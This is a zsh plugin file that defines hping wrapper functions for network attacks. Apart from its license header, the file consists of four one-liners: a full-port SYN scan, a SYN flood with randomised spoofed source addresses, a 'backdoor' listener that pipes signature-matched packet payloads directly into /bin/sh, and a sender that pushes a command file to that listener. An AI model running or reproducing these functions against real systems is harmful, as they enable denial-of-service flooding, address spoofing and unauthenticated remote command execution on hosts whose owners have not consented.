# {{{ File header. #############################################################
#                                                                              #
# File informations:                                                           #
# - Name:    external-tools/hping.zsh                                          #
# - Summary: Support for hping.                                                #
# - Authors:                                                                   #
#   - Alessandro Molari <molari.alessandro@gmail.com> (alem0lars)              #
#                                                                              #
# Project informations:                                                        #
#   - Homepage:        https://github.com/alem0lars/zsh-external-tools         #
#   - Getting started: see README.md in the project root folder                #
#                                                                              #
# License: Apache v2.0 (see below)                                             #
#                                                                              #
################################################################################
#                                                                              #
# Licensed to the Apache Software Foundation (ASF) under one more contributor  #
# license agreements.  See the NOTICE file distributed with this work for      #
# additional information regarding copyright ownership. The ASF licenses this  #
# file to you under the Apache License, Version 2.0 (the "License"); you may   #
# not use this file except in compliance with the License.                     #
# You may obtain a copy of the License at                                      #
#                                                                              #
#   http://www.apache.org/licenses/LICENSE-2.0                                 #
#                                                                              #
# Unless required by applicable law or agreed to in writing, software          #
# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT    #
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.             #
# See the License for the specific language governing permissions and          #
# limitations under the License.                                               #
#                                                                              #
# }}} ##########################################################################


if [[ "${commands[hping]}" ]]; then

  # $1 = target address
  # $2 = source interface
  function hping-port-scan() {
    sudo hping --scan 1-65535 -S $1 -I $2
  }

  # $1 = target address
  function hping-syn-flood() {
    sudo hping -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source $1
  }

  # $1 = signature
  # $2 = listen interface
  function hping-backdoor-listen() {
    hping -9 $1 -I $2 | /bin/sh
  }

  # $1 = signature
  # $2 = command file
  # $3 = target address
  function hping-backdoor-send() {
    hping -R -d 100 -c 1 -e $1 -E $2 $3
  }

fi


# vim: set filetype=zsh :
